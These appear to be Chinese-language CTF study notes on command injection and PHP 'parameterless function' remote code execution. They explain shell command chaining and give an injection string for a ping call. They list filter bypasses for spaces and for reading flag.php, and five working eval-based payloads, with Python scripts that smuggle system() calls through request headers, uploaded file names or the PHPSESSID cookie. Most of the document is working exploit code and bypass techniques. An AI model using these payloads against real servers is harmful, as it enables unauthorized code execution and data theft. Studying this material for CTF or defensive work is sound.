## 基本介绍
* A&B:　顺序执行多条命令，而不管命令是否执行成功

* A&&B: 顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令

* A|B: 管道命令，如：dir *.* /s/a | find /c \".exe\" 表示：先执行 dir 命令，对其输出的结果执行后面的 find 命令

* A||B: 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令


```php
$cmd = shell_exec( 'ping  -c 4 ' . $target );
// $target = 127.0.0.1 && calc
```

```php
if(!preg_match("/flag|system|php/i", $c)){
    eval($c);
}
/*
system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
反引号 同shell_exec()
*/
```

```php
空格绕过
1 ${IFS}
2 $IFS$9
3 {cat,flag.php} //用逗号实现了空格功能
4 %20
5 %09
```

```php
cat绕过
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
```

### PHP Parametric Function RCE

引用：https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE

https://www.cnblogs.com/BOHB-yunying/p/11616311.html

如果上传代码有如下约束
<pre><code class="php">
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
</code></pre>

只能执行a(b(c()))这样的代码，函数不能传参，如a(b('dd'))

*payload1*: array_rand(_flip(getenv())); 此方法随机获取数组值，具有一定随机性

*payload2*：eval(end(getallheaders()));  在request的header最后增加一个键值对，code: system('ls');

getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效

*payload3*: eval(end(current(get_defined_vars())));&var=system('ls');但一般网站喜欢对
$_GET
$_POST
$_COOKIE
做全局过滤，所以我们可以尝试从$_FILES下手，这就需要我们自己写一个上传
<pre><code class="python">
import requests
from io import BytesIO

payload = "system('ls /tmp');".encode('hex')
files = {
  payload: BytesIO('sky cool!')
}
r = requests.post('http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)
print r.content
</code></pre>

*payload4*: 可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即hex2bin
脚本如下

<pre><code class="python">
import requests
url = 'http://localhost/?code=eval(hex2bin(session_id(session_start())));'
payload = "echo 'sky cool';".encode('hex')
cookies = {
	'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content
</code></pre>

即可达成RCE和bypass的目的

*payload5*：有的时候不能RCE,但是可以试试读请
readfile(end(scandir(chr(time(chdir(next(scandir(chr(time())))))))));

构造最终payload:
<pre><code class="php">
echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
echo(readfile(end(scandir(chr(time(chdir(next(scandir(chr(time()))))))))));
</code></pre>
